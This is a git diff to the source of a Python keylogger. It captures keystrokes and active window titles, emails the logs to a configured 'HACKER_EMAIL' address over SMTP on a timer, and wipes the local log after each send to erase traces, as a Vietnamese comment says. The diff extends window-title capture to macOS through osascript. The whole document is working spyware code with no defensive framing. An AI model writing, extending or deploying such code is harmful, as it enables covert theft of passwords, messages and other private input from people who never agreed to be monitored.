@@ -1,5 +1,7 @@
 import os
 import ctypes
+import platform
+import subprocess
 import smtplib
 import threading
 import time
@@ -9,10 +11,12 @@ from pynput import keyboard
 from dotenv import load_dotenv
 import sys
 
+
 if getattr(sys, 'frozen', False):
     env_path = os.path.join(sys._MEIPASS, '.env')
 else:
     env_path = os.path.join(os.path.dirname(__file__), '.env')
+    
 load_dotenv(dotenv_path=env_path)
 
 LOG_FILE = os.getenv("LOG_FILE", "system_logs.txt")
@@ -22,11 +26,28 @@ HACKER_EMAIL = os.getenv("HACKER_EMAIL", SMTP_EMAIL)
 REPORT_INTERVAL = int(os.getenv("REPORT_INTERVAL", 60)) 
 
 def get_active_window_title() -> str:
-    hwnd = ctypes.windll.user32.GetForegroundWindow()
-    length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
-    buff = ctypes.create_unicode_buffer(length + 1)
-    ctypes.windll.user32.GetWindowTextW(hwnd, buff, length + 1)
-    return buff.value if buff.value else "Unknown Window"
+    """Hàm tự động nhận diện hệ điều hành và trích xuất tiêu đề cửa sổ"""
+    current_os = platform.system()
+    
+    try:
+        if current_os == "Windows":
+            hwnd = ctypes.windll.user32.GetForegroundWindow()
+            length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
+            buff = ctypes.create_unicode_buffer(length + 1)
+            ctypes.windll.user32.GetWindowTextW(hwnd, buff, length + 1)
+            return buff.value if buff.value else "Unknown Windows App"
+            
+        elif current_os == "Darwin":
+
+            script = 'tell application "System Events" to get name of first application process whose frontmost is true'
+            result = subprocess.run(['osascript', '-e', script], capture_output=True, text=True)
+            return result.stdout.strip() if result.stdout else "Unknown Mac App"
+            
+        else:
+            return f"Unsupported OS: {current_os}"
+            
+    except Exception:
+        return "Unknown Window"
 
 def send_log_via_email():
     if not os.path.exists(LOG_FILE):
@@ -55,6 +76,7 @@ def send_log_via_email():
         server.quit()
         print("[DEBUG] Email sent SUCCESSFULLY!")
         
+        # Xóa dấu vết sau khi gửi thành công
         with open(LOG_FILE, "w", encoding="utf-8") as f:
             f.write("")
     except Exception as e:
@@ -77,6 +99,7 @@ def start_keylogger() -> None:
         try:
             active_window = get_active_window_title()
             
+            # Ghi lại tiêu đề khi người dùng chuyển sang cửa sổ mới
             if active_window != current_window:
                 current_window = active_window
                 timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
